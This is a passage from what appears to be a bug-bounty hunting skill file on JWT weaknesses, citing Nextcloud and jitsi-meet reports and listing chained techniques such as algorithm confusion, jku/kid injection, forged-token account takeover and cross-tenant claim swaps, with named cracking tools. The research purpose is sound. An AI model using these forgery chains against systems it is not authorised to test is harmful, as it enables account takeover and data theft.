5. **Nextcloud — Authentication Bypass in ID4me handling via Missing JWT Signature Verification in User OIDC** ([H1 #3489490](https://hackerone.com/reports/3489490)) — missing JWT signature verification in user_oidc (CVE-2026-45156), 2026/$2,500.

6. **8x8 (jitsi-meet) — Authentication Bypass when using JWT w/ public keys** ([H1 #1210502](https://hackerone.com/reports/1210502)) — Prosody module accepting symmetric algorithms with public keys, letting arbitrary-source tokens gain protected-room access, 2021/no bounty.

---

## Related Skills & Chains

- **`hunt-jwt-crypto`** — the deep cryptographic-forgery subset (alg:none, RS256→HS256 key confusion, kid/jku/jwk injection). Chain primitive: this skill finds the forgeable token; jwt-crypto supplies the precise signing tooling.
- **`hunt-ato`** — JWT theft/forgery is one ATO path. Chain primitive: forge/stole token → account takeover of another user or admin.
- **`hunt-auth-bypass`** — SSO/SAML/OIDC token trust and issuer/audience confusion. Chain primitive: JWT audience/issuer bug → auth bypass across services ([#1889161]).
- **`hunt-api-misconfig`** — non-crypto JWT handling (claim trust, IDOR via claims, BOLA). Chain primitive: tenant claim swap → cross-tenant API access.
- **`hunt-idor`** — systematic claim-based IDOR. Chain primitive: edit `org_id`/`user_id` in a forged token → access another tenant's objects.
- **`hunt-ssrf`** — `jku`/`x5u` header injection makes the verifier fetch a key URL; chain an open redirect/SSRF so the fetch lands on your JWKS.
- **`hunt-source-review`** — downloading `*.js.map` and grepping `sourcesContent` is how client-side secrets are found ([#638635]).
- **`security-arsenal`** — load the JWT attack tooling set (jwt_tool, JWT Editor, hashcat mode 16500, rsa_sign2n, nuclei jwt templates) before running the forgery matrix.
- **`triage-validation`** — apply the Gate 0 discipline: a forge is only a finding when it yields cross-identity data or a privileged action, reproducible in 10 minutes.
